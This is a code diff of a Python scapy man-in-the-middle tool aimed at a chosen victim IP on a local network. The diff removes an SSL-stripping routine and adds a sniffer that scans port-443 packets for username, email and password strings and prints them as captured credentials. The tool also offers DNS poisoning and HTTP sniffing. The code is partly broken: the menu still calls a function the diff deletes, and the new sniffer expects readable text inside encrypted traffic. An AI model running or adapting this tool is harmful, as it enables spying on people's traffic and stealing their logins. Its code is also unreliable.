@@ -13,9 +13,9 @@ import subprocess
 import requests
 import re
 import ssl
-from urllib.parse import urlparse
 import socket
-import threading
+from OpenSSL import SSL
+from io import BytesIO
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -36,7 +36,7 @@ parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
-# SSL Stripping & HTTPS Sniffing
+# HTTPS Sniffing for Multiple Targets
 class Device:
     def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
@@ -51,22 +51,25 @@ class Device:
                 print('IP seems down, retrying ..')
                 continue
 
-    def capture_dns(self):
-        sniff(iface=self.iface, prn=self.dns,
-              filter=f'src host {self.targetip} and udp port 53', store=0)
+    def capture_https(self):
+        sniff(iface=self.iface, prn=self.https,
+              filter=f'tcp port 443 and host {self.targetip}', store=0)
 
-    def dns(self, pkt):
-        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
-        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
-        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
+    def https(self, pkt):
+        if pkt.haslayer('Raw'):
+            raw_data = pkt['Raw'].load.decode(errors='ignore')
+            # Print visited URL
+            if "Host:" in raw_data:
+                host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                print(f"{Fore.CYAN}Visited URL: https://{host}{Style.RESET_ALL}")
+            # Check for login or signup credentials
+            if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']):
+                print(f"{Fore.RED}[!] CREDENTIALS FOUND!:{Style.RESET_ALL}")
+                for line in raw_data.split('\r\n'):
+                    if any(keyword in line.lower() for keyword in ['username', 'user', 'login', 'email', 'password', 'pass', 'pwd', 'heslo']):
+                        print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
-    def arp_sniff(self):
-        def arp_pkt_callback(pkt):
-            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
-                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
-        sniff(iface=self.iface, prn=arp_pkt_callback,
-              filter=f'arp and host {self.targetip}', store=0)
-
+ 
     def http_sniff(self):
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
@@ -95,21 +98,6 @@ class Device:
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
-
-    def ssl_strip(self):
-        # Handle HTTPS stripping by redirecting HTTPS traffic to HTTP
-        def ssl_pkt_callback(pkt):
-            if pkt.haslayer(TCP) and pkt.haslayer(IP):
-                ip_src = pkt[IP].src
-                ip_dst = pkt[IP].dst
-                if pkt[TCP].dport == 443:  # HTTPS port
-                    print(f"{Fore.RED}SSL Stripping: {ip_src} -> {ip_dst} (HTTPS to HTTP){Style.RESET_ALL}")
-                    # Redirect the HTTPS request to HTTP (port 80)
-                    pkt[IP].dst = ip_src
-                    pkt[TCP].dport = 80
-                    send(pkt, iface=self.iface, verbose=False)
-
-        sniff(iface=self.iface, prn=ssl_pkt_callback, filter="tcp", store=0)
 
     def enable_ip_forwarding(self):
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
@@ -142,7 +130,7 @@ class Device:
     def sniff(self):
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. SSL Stripping\n6. Exit')
+            print(f'1. DNS Sniff\n2. HTTPS Sniff\n3. DNS Poison\n4. HTTP Sniff\n5. Exit')
             try:
                 choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
             except ValueError:
@@ -151,7 +139,7 @@ class Device:
             if choice == 1:
                 self.capture_dns()
             elif choice == 2:
-                self.http_sniff()
+                self.capture_https()
             elif choice == 3:
                 spoof_ips = {}
                 while True:
@@ -162,10 +150,8 @@ class Device:
                     spoof_ips[target] = ip
                 self.dns_poison(spoof_ips)
             elif choice == 4:
-                self.arp_sniff()
+                self.http_sniff()
             elif choice == 5:
-                self.ssl_strip()
-            elif choice == 6:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
             else:
